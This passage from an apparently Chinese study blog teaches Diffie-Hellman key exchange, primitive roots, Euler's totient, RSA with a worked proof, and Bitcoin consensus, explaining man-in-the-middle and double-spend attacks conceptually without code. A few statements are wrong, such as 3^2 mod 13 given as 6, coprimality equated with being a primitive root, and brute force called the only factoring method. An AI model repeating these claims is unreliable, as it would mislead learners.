<li><p>Alice和Bob收到$B$和$A$之后，分别计算：</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>现在Alice和Bob拥有了一个共同的密钥18。而且这个密钥从来没有在网络上传输过</p>
</li>
</ol>
<p>为什么Alice和Bob可以获得共同的公钥呢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>那现在看一下，DH算法可以运行的关键是什么？</p>
<p>即使攻击者Eve可以获得23、5、$A$和$B$，她仍然不能得到Alice和Bob的秘密数字4和3。也即，即使知道 $5^3mod(23)&#x3D;10$这个计算过程中的底数5，模数23和结果10，她依然不能得到指数3。这个就是DH算法所依赖的计算离散对数的难度。（证明计算离散对数很难超纲）</p>
<p>当然我们这里所举的例子非常简单，在实际使用中，必须使用很大的  $p,a,b$。如果 $p$长度为300位，$a$和$b$ 长度为100位，那基本就安全了。</p>
<h4 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h4><p>如果a是素数<em>p</em>的一个原根，那么数值：</p>
<p><em>a</em>mod<em>p</em>，<em>a^2</em> mod<em>p</em>，…，<em>a^(p-1)</em> mod<em>p</em></p>
<p>是各不相同的整数，且以某种排列方式组成了从<em>1</em>到<em>p-1</em>的所有整数。</p>
<p>例子，3是7的原根。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233995.jpg" alt="img">来自wiki</p>
<p>反例：3不是13的原根。<br>$$<br>3^1mod13&#x3D;3<br>\3^2mod13&#x3D;6<br>\3^3mod13&#x3D;1<br>\3^4mod13&#x3D;3<br>\3^5mod13&#x3D;9<br>\3^6mod13&#x3D;1<br>\3^7mod13&#x3D;3<br>$$</p>
<h4 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h4><p>欧拉函数描述的问题是，<strong>任意给定正整数n，在小于等于n的正整数之中，有多少个与n构成互质关系？这个函数一般表示为</strong>$\varphi(n)$。</p>
<p><strong>欧拉函数的通式</strong>：$\varphi(n)&#x3D;n(1-1&#x2F;p1)(1-1&#x2F;p2)(1-1&#x2F;p3)(1-1&#x2F;p4)……(1-1&#x2F;pn)$</p>
<p>其中p1, p2……pn为n的所有质因数(10的质因数是2和5, 4的质因子只有2)，n是不为0的整数。$\varphi(1)&#x3D;1$（唯一和1互质的数就是1本身）。</p>
<p>​                                                   $\varphi(x)&#x3D;x\prod_{i&#x3D;1}^n(1-\frac{1}{p_i})$</p>
<p>$\varphi(10)&#x3D;4$,      因为1,3,7,9和10互质</p>
<p>设m是正整数，a是整数，若a模m的阶等于$\varphi(m)$，则称a为模m的一个原根。对于(a,m)&#x3D;1的整数，满足a^r≡1 (mod m ) 的最小整数r,称为a模m的阶。即$a^{\varphi(m)}\equiv1(modm)$</p>
<p>【m有原根的充要条件是$m&#x3D; 1,2,4,p,2p,p^n$，其中p是奇质数(除2以外的所有质数)，n是任意正整数；也即不是所有的数都有原根】</p>
<p>如果正整数m有原根，那么原根的个数为 $\varphi(\varphi(m))$</p>
<p>另外补充一下欧拉定理。如果整数$a$和$m$互质,那么$a^{\varphi(m)}\equiv1(modm)$ .费马小定理是欧拉定理当$m$ 是素数时的特例。（欧拉定理很有用，在后面RSA中还会出现。）</p>
<p>例1:n &#x3D; 23而言，原根的个数应该是<br>$$<br>\varphi(23)&#x3D;23*(1-\frac{1}{23})&#x3D;22 \<br>\varphi(\varphi(23))&#x3D;\varphi(22)&#x3D;22*(1-\frac{1}{2})*(1-\frac{1}{11})&#x3D;10<br>$$</p>
<p>可以很容易算出，从1~p-1的22个数中，</p>
<p>5, 7, 10, 11, 14, 15, 17, 19, 20, 21共10个数字是23的原根。</p>
<p>例2:n &#x3D; 13而言，原根的个数应该是<br>$$<br>\varphi(13)&#x3D;13*(1-\frac{1}{13})&#x3D;12 \<br>\varphi(\varphi(13))&#x3D;\varphi(12)&#x3D;12*(1-\frac{1}{2})*(1-\frac{1}{3})&#x3D;4<br>$$</p>
<p>可以很容易算出，从1~p-1的12个数中，</p>
<p>2 5 7 11是13的原根</p>
<p>所以这里有一个问题是，为什么在DH算法中，要强调使用的是原根？而不是和 $p$的任意数字？因为根据素数的特性，不论是不是原根，下面的等式总是成立的。</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>这里主要涉及的问题是，破解的难度。</p>
<p>如果使用的g不是p的原根,那么g的所有指数只能生成小于p的整数的一个子集.那么对于攻击者而言,此时即使是暴力破解,需要计算的也只是小于p的整数的子集,而不是小于p的整数全部.</p>
<p>譬如，对于素数13而言，3不是它的原根，(3^1&#x3D;3, 3^2&#x3D;9, 3^3&#x3D;1)mod（13），所以生成的模数只有3个（order），等效的指数也只有3个，降低了攻击者暴力破解的难度。</p>
<p>例如，在DH系统中，如果选择g&#x3D;3，Alice选择了 a&#x3D;7那么对于攻击者Eve而言，本来她需要尝试到7（遍历小于13的全部数字）才能得到 $3^7mod(13)&#x3D;3$；但是实际上，Eve只需要知道 $3^1mod(13)&#x3D;3$就足够了。因为最终的$s&#x3D;[g^{ab}&#x3D;g^{7*b}&#x3D;(g^1)^b]mod(13)$</p>
<p>所以大大降低了DH算法的破解难度。</p>
<p>另外，还需要注意一点，DH算法并没有对双方身份进行验证。当Alice和Bob希望进行通信时，Eve可以很容易地向Alice冒充自己是Bob，以及向Bob冒充自己是Alice，然后分别和Alice和Bob建立公共的对称密钥。然后，Alice到Bob的通信都会通过Eve先使用自己与Alice建立的密钥先解密，获得明文信息之后，再用Eve与Bob建立的密钥加密，传给Bob。Bob到Alice的通信亦然。这样，Alice和Bob会以为自己和对方的通信是加密的，从而是安全的，但是它们的通信会经过Eve加解密一遍。Eve在Alice和Bob之间，拦截他们的通信，并且维持通信，就称为中间人攻击。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233996.jpg" alt="img"></p>
<p>为了防御中间人攻击，就需要一个能够验证通信双方身份的机制来防止这种攻击。</p>
<hr>
<p>补充， $\varphi(n)$的计算.举例来说,$\varphi(10)$计算的是不超过10的自然数中与10互质的数的个数。因为10&#x3D;2*5，也即不超过10的自然数中，所有2的倍数，以及所有5的倍数都不与10互质。所以可以通过减去2的倍数的个数、5的倍数的个数，以及根据容斥原理，再加上同时是2和5的倍数的数字的个数，就可以算出来不超过10的自然数中与10互质的数字的个数。也即，</p>
<p>$10-(10\div2)-(10\div5)+(10\div(2\times5))&#x3D;4$</p>
<p>上面的式子可以改写成：</p>
<p>$10\times(1-\frac{1}{2})\times(1-\frac{1}{5})&#x3D;4$</p>
<p>上面的式子可以进一步理解为：</p>
<p>$\varphi(10)&#x3D;\varphi(2\times5)&#x3D;\varphi(2)\times\varphi(5)$</p>
<p>上面的公式是不是可以扩展为：</p>
<p>$\varphi(p\times q)&#x3D;\varphi(p)\times\varphi(q)$？</p>
<p>上述结论在p 和q没有共同公因子的情况下是可以成立的。但是在p和q共同公因子的情况下则有问题。譬如考虑 $\varphi(8)$的情况。不大于8的自然数中与8互质的数就是去除所有2的倍数的数。因此，</p>
<p>$\varphi(8)&#x3D;8-8\div2&#x3D;8\times(1-\frac{1}{2})$</p>
<p>在上面的计算中，虽然 $8&#x3D;2^3$ ，但是$\varphi(8)$  的计算与次幂无关。因此，如果将8进行分解，譬如，分解成</p>
<p>$\varphi(8)&#x3D;\varphi(2\times4)&#x3D;\varphi(2)*\varphi(4)$</p>
<p>是有问题的。相当于多乘了1&#x2F;2。也即，在质因子有幂乘的情况下，不能将质因子分解到两个乘数中去。这样看来，如果计算$\varphi(100)$，不能将100分解成$10<em>10$，而应该分解为$4</em>25$。这样计算得出</p>
<p>$$\varphi(100)&#x3D;\varphi(4)<em>\varphi(25)&#x3D;2</em>20&#x3D;40$$</p>
<p>同时，$\varphi(p^n)&#x3D;p^n\times(1-\frac{1}{p}&#x3D;p^{n-1}*(p-1))$也可以便于计算。</p>
<h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p>对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<br>假如有人找到一种快速因数分解的算法，那么RSA的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA密钥才可能被暴力破解。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。<br>只要密钥长度足够长，用RSA加密的信息实际上是不能被解破的。</p>
<h4 id="RSA过程的具体例子"><a href="#RSA过程的具体例子" class="headerlink" title="RSA过程的具体例子"></a>RSA过程的具体例子</h4><ol>
<li><p>挑选两个质数，如 $p&#x3D;61,q&#x3D;53$</p>
</li>
<li><p>计算$n&#x3D;p*q&#x3D;3233$</p>
</li>
<li><p>计算$\varphi(n)&#x3D;\varphi(p)<em>\varphi(q)&#x3D;(p-1)</em>(q-1)&#x3D;3120$【这一步可以计算（p-1）和（q-1）的最小公倍数，从而使得计算的d比较小；17关于780的模逆是413，比2753要小】</p>
</li>
<li><p><strong>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。</strong></p>
<p>在1到3120之间，随机选择e&#x3D;17。（实际应用中，常常选择65537。）</p>
</li>
<li><p>计算得出d， 使得d是e关于3120的模逆，得出d &#x3D; 2753（模逆可以使用Euclid扩展算法，证明略）</p>
</li>
<li><p><strong>将n和e封装成公钥，n和d封装成私钥。</strong> </p>
<p>在该例子中，n&#x3D;3233，e&#x3D;17，d&#x3D;2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
</li>
</ol>
<h4 id="RSA算法的可靠性"><a href="#RSA算法的可靠性" class="headerlink" title="RSA算法的可靠性"></a>RSA算法的可靠性</h4><p>回顾密钥生成过程一共出现了6个数字: $p&#x3D;61,q&#x3D;53,n&#x3D;3233,\varphi(n)&#x3D;3120,e&#x3D;17,d&#x3D;2753$</p>
<p>除了公钥的n和e,其余4个数字都是不公开的,在已知n和e的情况下能不能推出d?</p>
<ol>
<li>$e*d mod\varphi(n) &#x3D; 1$ 只有知道$e$和$\varphi(n)$,才能算出$d$,e已知,接下来只需求$\varphi(n)$</li>
<li>$\varphi(n)&#x3D;(p-1)(q-1)$,只有知道p和q才能算出$\varphi(n)$</li>
<li>$n&#x3D;p*q$ 只有将n因数分解才能算出p和q</li>
</ol>
<p><strong>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。</strong></p>
<p>可是，大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。p和q数字越大,破解难度越高,当然对应的加密解密时间也越长</p>
<p>例如:</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　12301866845301177551304949<br>　　　　　　　　　　　　　　　　58384962720772853569595334<br>　　　　　　　　　　　　　　　　79219732245215172640050726<br>　　　　　　　　　　　　　　　　36575187452021997864693899<br>　　　　　　　　　　　　　　　　56474942774063845925192557<br>　　　　　　　　　　　　　　　　32630345373154826850791702<br>　　　　　　　　　　　　　　　　61221429134616704292143116<br>　　　　　　　　　　　　　　　　02221240479274737794080665<br>　　　　　　　　　　　　　　　　351419597459856902143413</p>
</blockquote>
<p>它等于这样两个质数的乘积：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　33478071698956898786044169<br>　　　　　　　　　　　　　　　　84821269081770479498371376<br>　　　　　　　　　　　　　　　　85689124313889828837938780<br>　　　　　　　　　　　　　　　　02287614711652531743087737<br>　　　　　　　　　　　　　　　　814467999489<br>　　　　　　　　　　　　　　　　　　×<br>　　　　　　　　　　　　　　　　36746043666799590428244633<br>　　　　　　　　　　　　　　　　79962795263227915816434308<br>　　　　　　　　　　　　　　　　76426760322838157396665112<br>　　　　　　　　　　　　　　　　79233373417143396810270092<br>　　　　　　　　　　　　　　　　798736308917</p>
</blockquote>
<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>
<h4 id="加密解密过程"><a href="#加密解密过程" class="headerlink" title="加密解密过程"></a>加密解密过程</h4><p><strong>（1）加密要用公钥 (n,e)</strong></p>
<p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
<p>所谓”加密”，就是算出下式的c：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^e ≡ c (mod n)$</p>
</blockquote>
<p>爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$65^{17} ≡ 2790 (mod 3233)$</p>
</blockquote>
<p>于是，c等于2790，鲍勃就把2790发给了爱丽丝。</p>
<p><strong>（2）解密要用私钥(n,d)</strong></p>
<p>爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c^d ≡ m (mod n)$</p>
</blockquote>
<p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$2790^{2753} ≡ 65 (mod 3233)$</p>
</blockquote>
<p>因此，爱丽丝知道了鲍勃加密前的原文就是65。</p>
<p>至此，”加密–解密”的整个过程全部完成。</p>
<p>我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。</p>
<p>你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如<a href="https://zh.wikipedia.org/wiki/%E8%B5%84%E6%96%99%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">DES</a>），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。</p>
<h4 id="私钥解密证明"><a href="#私钥解密证明" class="headerlink" title="私钥解密证明"></a>私钥解密证明</h4><p>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c^d ≡ m (mod n)$</p>
</blockquote>
<p>因为，根据加密规则</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$ｍ^e ≡ c (mod n)$</p>
</blockquote>
<p>于是，c可以写成下面的形式：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c &#x3D; m^e - k*n$</p>
</blockquote>
<p>将c代入要我们要证明的那个解密规则：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(m^e - k*n)^d ≡ m (mod n)$</p>
</blockquote>
<p>它等同于求证</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{e*d} ≡ m (mod n)$</p>
</blockquote>
<p>由于</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$e*d ≡ 1 (mod φ(n))$</p>
</blockquote>
<p>所以</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$e<em>d &#x3D; h</em>φ(n)+1$</p>
</blockquote>
<p>将ed代入：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{h*φ(n)+1} ≡ m (mod n)$</p>
</blockquote>
<p>接下来，分成两种情况证明上面这个式子。</p>
<p><strong>（1）m与n互质(如果m与n互质,则m是n的原根)。</strong></p>
<p>根据欧拉定理，此时</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{φ(n)}≡ 1 (mod n)$</p>
</blockquote>
<p>得到</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(m^{φ(n)})^h * m ≡ m (mod n)$</p>
</blockquote>
<p>原式得到证明。</p>
<p><strong>（2）m与n不是互质关系。</strong></p>
<p>此时，由于n等于质数p和q的乘积，所以m必然等于k*p或k*q。</p>
<blockquote>
<p>因为m与n不是互质关系，说明m与n有共同的公因子g，假设m&#x3D;hg，由于n&#x3D;pq，p与q互质，n只有p和q两个因子，所以g和h必然有一个等于q或者p， 所以才有结论“m必然等于kp或kq”</p>
</blockquote>
<p>以 m &#x3D; kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k*p)^{q-1} ≡ 1 (mod q)$</p>
</blockquote>
<p>进一步得到</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$[(k<em>p)^{q-1}]^{h(p-1)} *  k</em>p ≡ k*p  (mod q)$</p>
</blockquote>
<p>即</p>
<blockquote>
<p>　　　　　　　　$(k<em>p)^{e</em>d} ≡ k*p (mod q)$</p>
</blockquote>
<p>将它改写成下面的等式</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k<em>p)^{e</em>d} &#x3D; t<em>q + k</em>p$</p>
</blockquote>
<p>这时t必然能被p整除，即 t&#x3D;t’*p</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k<em>p)^{ed} &#x3D; t’<em>p</em>q + k</em>p$</p>
</blockquote>
<p>因为 m&#x3D;kp，n&#x3D;pq，所以</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{e*d} ≡ m (mod n)$</p>
</blockquote>
<p>原式得到证明。</p>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>数字签名</p>
<h3 id="ECC椭圆曲线加密"><a href="#ECC椭圆曲线加密" class="headerlink" title="ECC椭圆曲线加密"></a>ECC椭圆曲线加密</h3><p>RSA算法是当前使用最广的非对称加密算法。但是RSA的缺点在于为了抵抗攻击，不得不增加公钥的长度。而随着长度的增加，计算量和复杂度也不断增加。正是因为非对称加密复杂度太高，所以一般仅用于在网络连接建立时的密钥协商过程。而且随着数字大小的增加，分解的效率会提高，乘法和分解的难度差距会减小。</p>
<p>所以RSA并不是将来密码学中最理想的系统。在理想的trapdoor函数中，正向计算（简单的计算）和反向计算（复杂计算）的难度应该随着数字的增加同步地增加。 所以需要更好的trapdoor函数。</p>
<h3 id="非对称加密在区块链中的应用"><a href="#非对称加密在区块链中的应用" class="headerlink" title="非对称加密在区块链中的应用"></a>非对称加密在区块链中的应用</h3><p>具体实现:</p>
<ol>
<li>首先生成一对公私钥 (pk,sk)。 pk是公钥，sk是私钥。</li>
<li>签名sign。sig &#x3D; sign(sk, message) ,使用私钥对一份消息message进行处理，譬如先对message进行哈希得到摘要，然后使用私钥对摘要进行加密。</li>
<li>验证verify。 verify(pk, message, sig)。验证方法，获得输入message，签名的结果sig，以及公钥。譬如，可以使用公钥对签名结果进行解密，对message进行同样散列得到的摘要，比较解密的结果和摘要结果，如果两个相同，这验证通过，否则，验证失败。</li>
</ol>
<h1 id="区块链技术6-去中心化"><a href="#区块链技术6-去中心化" class="headerlink" title="区块链技术6:去中心化"></a>区块链技术6:去中心化</h1><p>去中心化问题:分布式一致性性问题</p>
<p>分布式好处是更加可靠</p>
<p>对于去中心化，比特币区块链主要面临的五个问题：</p>
<ol>
<li>谁维护交易账本？</li>
<li>谁能决定交易是否是有效的？</li>
<li>谁创建新的比特币？</li>
<li>谁决定系统变化的规则？</li>
<li>比特币如何获得交易的价值？</li>
</ol>
<h2 id="分布式共识（distributed-consensus"><a href="#分布式共识（distributed-consensus" class="headerlink" title="分布式共识（distributed consensus)"></a>分布式共识（distributed consensus)</h2><p>给出分布式共识协议的一个定义和描述：</p>
<p>有 n 个节点，每个节点都有输入值。有一些节点出故障或者是恶意的。分布式共识协议的特点是：</p>
<ul>
<li>必须能够使得所有的诚实节点就输入值达成一致</li>
<li>该最终一致的值是由诚实节点产生的</li>
</ul>
<h2 id="区块链共识算法"><a href="#区块链共识算法" class="headerlink" title="区块链共识算法"></a>区块链共识算法</h2><p>在区块链中，一次交易可能是Alice从Bob那里买了一本书，或者是其它物品，这可以线下商议，然后Alice需要支付给Bob一个比特币。在比特币网络中，Alice需要广播一条消息，譬如“Alice支付给Bob 1个比特币。”并且使用私钥对消息进行签名。</p>
<p>现在的问题是，Bob如何能确认，自己确实能够收到这个比特币，然后将Alice购买的物品发给她。</p>
<p>比特币系统的特殊之处在于：</p>
<ol>
<li>引入了激励机制。因为比特币本身就是一种货币，所以参与者有强烈的意愿能获得这个奖励。也就是说，维持整个系统正常工作才符合大多数人的利益。</li>
<li>比特币的随机性。比特币网络中的共识并不是一下子就确定的，在实际中，差不多是一个小时之后，基本可以认为对一个区块或者一笔交易进行了确认。但是，即使在这个时候，也还不能确认100%。而是，随着时间的流逝，确认性会逐渐增强。</li>
</ol>
<p>比特币网络实现的是<strong>隐含共识</strong>（implicit consensus）：一个区块就是一个共识的过程，随机的节点可以提出新区块。即使提出新区块的节点是恶意的，提出时也没有显示的投票或者其他过程。建立共识的过程是隐式的，其它节点如果接受这个区块，就会延伸它；否则拒绝这个区块，则会无视它，并尝试建立新区块去取代它。</p>
<p>简化的比特币的共识算法过程如下：（这里没有讨论广播新区块的节点是如何选出的）</p>
<ol>
<li>向所有的节点广播新的交易。</li>
<li>每个节点将新交易打包进区块。</li>
<li>每一轮中一个随机的节点广播该区块。</li>
<li>如果区块中所有的交易都是有效的（比特币没有重花，签名正确等），则其他节点接受这个区块；</li>
<li>节点表示接受该区块的方式是在之后新创建的区块中包括这个块的哈希。</li>
</ol>
<p>针对这个算法讨论一下在货币网络中可能的攻击方法。</p>
<ol>
<li>偷比特币。Alice有没有可能去使用其他用户的比特币呢？譬如Alice创建了一个区块，区块中她试图伪造一个交易“Bob发送10个比特币给Alice。”如果要让这个交易合法，那么Alice必须能够伪造Bob的签名，但是Alice如果没有Bob的私钥，那么Alice就不能伪造签名。所以，只要底层的密码学基础没有被破坏，Alice就不可能偷Bob的币。</li>
<li>拒绝服务。如果Alice非常讨厌Bob，她不愿意为Bob提供服务，譬如在自己创建的区块中，Alice就会故意忽略掉Bob相关的交易。这个攻击的问题是，Alice并不能控制区块的产生。即使Alice在一个区块中忽略了Bob的交易，其他诚实的节点会在交易中包括Bob的交易。</li>
<li>双重支付。假设Alice从Bob购买了一个软件，然后她广播了一条交易“Alice付给Bob一些比特币”。诚实的节点看到了这条交易，并且将交易包含在区块中。当Bob看到这条交易被包括进去的时候，Bob认为Alice已经支付了，所以将软件发送给了Alice。然后Alice开始准备攻击，她自己或者她控制的节点开始准备下一个区块，在这个区块中包含的消息是把Alice刚才付给Bob的币付给自己或者她控制的账号“Alice付给Alice一些比特币”。如果Alice能够给成功地将第二条支付信息包含在区块链中，那么第一条消息，将会被忽视，就像从来没有出现过一样。</li>
</ol>
<p>下面是双重支付的示例图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233997.jpg" alt="img"></p>
<p>Alice可以构造一个新的交易，将支付给Bob的钱再支付给自己。如果她能控制后续区块的产生，那么付给Bob的交易会像从来没有存在过一样。</p>
<p>问题是，双重攻击能否成功，完全取决于区块链到底沿着那条链延续。诚实的节点会沿着最长的链创建自己的区块。所以答案就是，没有正确的答案。</p>
<p>在Alice创建了双重攻击的区块之后，对于其他的节点而言，两个分支具有一样的长度；而且两个块都是有效的，那么其他节点会选择哪个分支就决定了攻击成功与否。但是对于其他的节点而言，这两个交易的地位是完全相同的。我们认为Alice付给自己的交易是欺骗，那是因为我们知道Alice首先付给了Bob。但是，对于没有全局时间的网络而言，这两个交易是等价的。而且Alice还可以通过一些方法使得下一个区块沿着自己的分支延伸。</p>
<p>那么Bob如何应对这个问题呢？</p>
<p>如果Bob容易轻信，那么他可能在发现Alice发布了付币给自己的时候就同意将软件发给Alice，这个时候，称作Zero-Confirmation Transaction（零确认交易）。如果Bob有更多的保护自己的意识，他会等到Alice付钱给自己的交易被多次确认之后才将软件发给Alice。当交易被包含在区块中，称作一次确认；如果包含交易的区块之后又来了一个区块，称作2次确认。以此类推。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233998.jpg" alt="img"></p>
<p>只要Bob等足够的时间，那么当他发现包含Alice付钱给自己的区块已经被遗弃的时候，他会放弃这次交易并且拒绝将软件发给Alice。一般而言，一个交易获得的确认越多，这个交易成为最终的系统的共识的概率越大。</p>
<p>在比特币系统中的一般做法是等6个确认。6是在等待时间和确认之间的一个折中。</p>
<p>综上，能够防止双重支付成功的原因，也即，包括双重支付的区块不能最终包括在链中的原因是我们假设大部分的节点是诚实的。从密码学的角度，两个交易都是正确的。 所以，为了确认形成了共识，需要等待一段时间，确定最终区块链中到底包含了哪一个块。而且，随着区块的增加（确认数的增加），交易变无效的可能性是指数级降低的。因此，可以等待6个区块，也即差不多1个小时的时间，基本上不会再翻盘了。</p>
<p>激励和工作证明（PoW）</p>
<p>在之前的过程中，我们多次做了假设，大部分的节点是诚实节点——诚实的节点会将自己收到的广播的交易打包，诚实的节点会沿着最长的分支扩展。但是，节点有没有必要保持诚实呢？或者说，能不能给节点激励，让节点维持诚实？</p>
<p>实际上，即使能够证明有的节点正在尝试进行双重支付攻击，因为节点没有标识，所以即使发现，也不能进行惩罚。所以，问题变成了，如果节点保持诚实，能不能获得奖励？同样的，因为如果节点没有身份标识，不可能寄支票给诚实的节点，所以，对诚实的形成区块的节点的奖励就是比特币。</p>
<p>在比特币网络中，共有两个激励方式。一种是Block reward（区块奖励），一种是transaction fees（交易费用）。</p>
<p>区块奖励是这样的，任何创造出区块的节点可以在区块中包括一个特殊的交易——创造币的交易，并且节点可以选择交易的接收地址。当然， 节点大概率把接收地址设置为自己。可以理解为这是对节点创造区块的奖励。</p>
<p>目前为止，创造一个区块的奖励是25个币，然后每210,000个区块这个数字会减半。按照生成区块的速度，差不多每四年，区块奖励会减半。</p>
<p>第一眼看来，这个好像没什么用处。因为，不管节点创造的是好的区块还是包括攻击交易的区块，他都能获得奖励。但是，这个奖励什么时候才有用呢？只有在他的区块被包括在长链中才行。因此，如果一个区块中包括无效的交易，这个区块相当于会被丢弃。所以，所有的节点都能尽力表现得诚实，这样，其他节点才会沿着他的区块继续添加新的区块。</p>
<p>同时，区块奖励也是唯一的创建新的比特币的方法。从下图可以看出，每四年比特币的区块奖励降低一半，比特币系统中币的总数设置在21,000，000。也即，总有一天，创建区块不会产生新的币，或者币回报太少，而没有人愿意去创建区块。</p>
<p>那个时候，会不会产生欺诈呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233999.jpg" alt="img"></p>
<p><strong>交易费用。</strong>比特币中的第二个激励机制是交易费用。交易的创建者可以在创建交易时，输入大于输出，其中的差值就是交易费用。所以，即使当创建区块不会产生币的时候，交易费用会变得很重要。同时，对于交易者而言，如果希望自己的交易被快速地确认，毫无疑问地，在交易中包括多一点的费用是一个好的方法。</p>
<p>这时候，来理一下思路。</p>
<ol>
<li>我们要求创造新区块的节点是随机的。</li>
<li>我们给创造区块的节点奖励，那样会有很多节点希望参与。</li>
<li>从前两点还会引出的问题是：会不会有节点发动女巫攻击，创造很多的节点以获得奖励？</li>
</ol>
<p>所有三个问题的答案实际上是一个PoW，proof of work。基本思路就是，挑选节点的时候，要根据一种人们不能独占的资源来选择，譬如，算力，computer power。在PoW中，就是让节点进行竞争，算力最强能够胜出，也相当于是按照算力按比例进行选择。</p>
<p>从另一方面来讲，这对希望参与的节点设置了门槛，必须有足够的算力资源才能参与到区块的创建中。因此，即使有人想发动Sybil Attack，如果不能控制更多的算力，创建新的节点是没有用的。</p>
<p>比特币的工作证明就是hash puzzles。为了创建一个区块，节点需要能够找到一个数值，nonce，使得当计算哈希时，前一个hash，包含在区块中的交易，以及nonce这三者连接之后，它的哈希值小于某个target。</p>
<p>用公式写出来，长这样：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233000.jpg" alt="img"></p>
<p>之前我们讲过hash具有的特点是puzzle friendliness，找到这个Nonce的唯一方法就是尝试各种值，直到运气好找到一个。</p>
<p>工作证明的存在基本上实现了对随机性的要求，没有谁能够指定哪个节点可以产生下一个区块；同时，排除了Sybil Attack的可能，创建有竞争力的节点代价太高。</p>
<p>比特币中的hash计算有三个特点。</p>
<ol>
<li>很难计算。在2014年，产生一个区块需要的计算大概是 10^20 次哈希。面对这样的计算量，普通的笔记本电脑根本没有竞争力。也因此，参与计算的行为被称作mining，挖矿。</li>
<li>难度可调节。难度调整逻辑被写在代码中，在每个全节点中独立自动发生。每2016个块，所有的节点一起参与计算，重新定义target。target的目标是，使得每隔10分钟才能产生一个新区块。按照这个速度，每两周，target重新定义一次。这也意味着，随着整个系统的算力增加， 创建一个区块会越来越难。为什么需要10分钟创建一个区块呢？如果不自动调整target，随着算力的增加，创建区块的速度会越来越快，可能打包的交易会变少。当然，速度太慢就不适合一些吞吐量大的服务。所以最佳速度一直是个问题。</li>
<li>验证非常容易。</li>
</ol>
<p>也正是因为工作量证明，保证了如果大部分的节点（以算力而不是个数）是诚实的，那么至少有50%的可能，下一个区块来自于诚实的节点。</p>
<p>总结：</p>
<p>每个人都可以参与比特币协议，而且不需要现实世界的身份，只要创建一对公私钥对就行。而且可以创建任意多的公私钥。交易实际上就是在网络中广播的信息。比特币就是交易的输出。（比特币的最小单位是0.00000001，单位为1聪Satoshi）比特币网络的目标是将交易和新区块向全网广播，网络通过区块链和共识机制保障安全。当我们说交易包括在区块链中，实际上是这个交易获得了多次的确认。</p>
<p>最后，讨论一下51%攻击。</p>
